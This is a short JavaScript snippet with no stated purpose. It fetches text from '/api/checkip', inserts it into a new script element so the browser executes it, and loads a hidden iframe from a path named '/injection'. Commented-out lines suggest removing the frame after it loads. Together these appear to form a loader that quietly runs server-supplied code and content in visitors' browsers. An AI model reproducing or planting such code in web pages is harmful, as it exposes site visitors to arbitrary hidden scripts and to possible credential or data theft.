var xmlhttp = new XMLHttpRequest();
var url = "/api/checkip";

xmlhttp.onreadystatechange = myfunction;
xmlhttp.open("GET", url, true);
xmlhttp.send(null);

function myfunction() {
    if (xmlhttp.readyState == 4) {
        //window.alert("completed");
        var y = xmlhttp.response;
        //alert(y);
        var k = document.createElement('script');
        //k.setAttribute("id", "checkmatekkqk");
        k.innerHTML = y;
        document.body.appendChild(k);
        //document.getElementById('checkmatekkqk').innerHTML = y;
    }
}

(async function() {
    var i = document.createElement('iframe');
    i.style.display = 'none';
    //i.onload = function() { i.parentNode.removeChild(i); };
    i.src = '/injection';
    document.body.appendChild(i);
})();